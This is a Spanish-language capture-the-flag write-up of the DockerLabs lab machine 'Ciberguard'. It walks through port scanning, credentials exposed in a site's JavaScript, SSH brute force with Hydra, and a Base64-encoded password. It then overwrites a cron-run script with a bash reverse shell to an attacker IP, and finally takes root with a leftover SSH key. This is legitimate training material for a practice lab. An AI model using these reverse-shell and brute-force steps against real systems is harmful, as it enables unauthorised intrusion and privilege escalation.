# 🖥️ Writeup - Ciberguard 

**Plataforma:** Dockerlabs  
**Sistema Operativo:** Linux  

# INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash 
unzip ciberguard.zip
```
La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh ciberguard.tar
``` 
Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
``` 

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

# ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
``` 

```bash
nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
```

Info:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-09 16:02 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000024s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:f6:3a:98:23:dc:8b:00:f0:5c:d5:50:07:f9:ec:e7 (ECDSA)
|_  256 b0:4e:cb:2a:e0:ac:cf:4c:14:7b:23:57:00:6d:12:1d (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: CyberGuard - Seguridad Digital
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.70 seconds
```

En el puerto `80` encontramos una página web aparentemente normal con un panel de `login`, pero al inspeccionar el código fuente hallamos un archivo `script.js` que podría darnos información interesante.

Al final del script aparece una lista de usuarios válidos con sus contraseñas, lo que nos permite acceder al dashboard a través del `login` de la página.

```
const usuariosPermitidos = {
    'admin': 'CyberSecure123',
    'cliente': 'Password123',
    'chloe' : 'chloe123'
};
```

Sin embargo, una vez dentro no vemos ninguna vía de explotación clara.

Guardamos los usuarios en un archivo `users.txt` y las contraseñas en `pass.txt` para hacer fuerza bruta a `SSH` con `Hydra`.

# HYDRA

```bash 
hydra -L users.txt -P pass.txt ssh://172.17.0.2 -t 64
```

Info:
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-09 16:16:06
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: chloe   password: chloe123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-09 16:16:20
```

Descubrimos que, con las credenciales encontradas anteriormente, podemos acceder por `SSH` con el usuario `chloe` : `chloe123`.

```bash
ssh chloe@172.17.0.2
```

# ESCALADA DE PRIVILEGIOS

Una vez dentro, comprobamos permisos `sudo`, `SUID`, `Capabilities`.

No obstante, no encontramos nada relevante.

Ejecutamos un cat `/etc/passwd` para listar todos los usuarios del sistema y vemos que existen dos más aparte de `chloe`: `pablo` y `veronica`.

Al acceder a `/home/veronica`, tenemos permisos para entrar y leer los archivos de la carpeta. En uno de ellos encontramos lo siguiente: 

```
dmVyb25pY2ExMjMK
```

Parece un `string` encriptado en `Base64`, así que probamos a decodificarlo con el comando correspondiente.


```bash
echo "dmVyb25pY2ExMjMK" | base64 -d
```

Info:
```
veronica123
```

cuando intentamos pivotar al usuario `veronica` con la contraseña `veronica123` no obtenemos resultados, por lo que probamos directamente con el `string` en `Base64`.

```bash
su veronica
```

Una vez dentro del usuario veronica seguimos buscando entre sus archivos y encontramos, en la carpeta `/.local`, un `script` de `bash`:

```
#!/bin/bash


hora_actual=$(date +"%H:%M:%S")


echo "La hora actual del sistema es: $hora_actual" >> /tmp/hora/hora.log
```

Es muy probable que exista un `crontab` que ejecute este `script` cada cierto tiempo, por lo que, si podemos modificarlo, podremos inyectar código arbitrario para escalar privilegios.

```bash
printf '#!/bin/bash\nbash -i >& /dev/tcp/10.0.4.12/4444 0>&1\n' > script-h.sh
```

Hemos editado el `script` de `bash` para que nos envíe una `reverse shell` a nuestra máquina atacante.

Colocamos el `listener` en Kali y, al cabo de unos segundos, recibimos la `reverse shell` como el usuario `pablo`.

```
sudo nc -nlvp 4444
```

Info:
```
listening on [any] 4444 ...
connect to [10.0.4.12] from (UNKNOWN) [172.17.0.2] 33726
bash: cannot set terminal process group (427): Inappropriate ioctl for device
bash: no job control in this shell
pablo@8327ac6ad2ce:~$
```

# TTY

Antes de buscar vectores de escalada de privilegios, vamos a hacer un tratamiento de TTY para tener una shell más interactiva, con los siguientes comandos:

```bash
script /dev/null -c bash
```
`ctrl Z`
```bash
stty raw -echo; fg
```
```bash
reset xterm
```
```bash
export TERM=xterm
```
```bash
export BASH=bash
```

# ESCALADA A ROOT

Comprobamos permisos `sudo`, `SUID`, `Capabilities`.

```bash
sudo -l
```

Info:
```
Matching Defaults entries for pablo on 8327ac6ad2ce:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User pablo may run the following commands on 8327ac6ad2ce:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/nllns/clean_symlink.py *.jpg
```

Comprobamos que el usuario `pablo` puede ejecutar el binario `python3` con privilegios de cualquier usuario del sistema.

Continuamos buscando y encontramos en `/tmp` un archivo `id_rsa` que podría pertenecer al usuario `root`.

Mostramos el contenido de la `key` y lo copiamos en nuestra máquina atacante dentro de un archivo llamado `id_rsa`.

Le damos los permisos necesarios:

```bash
chmod 600 id_rsa
```
```bash
ssh -i id_rsa root@172.17.0.2
```

Info:
```
root@8327ac6ad2ce:~# whoami
root
root@8327ac6ad2ce:~#
```

Ya somos root!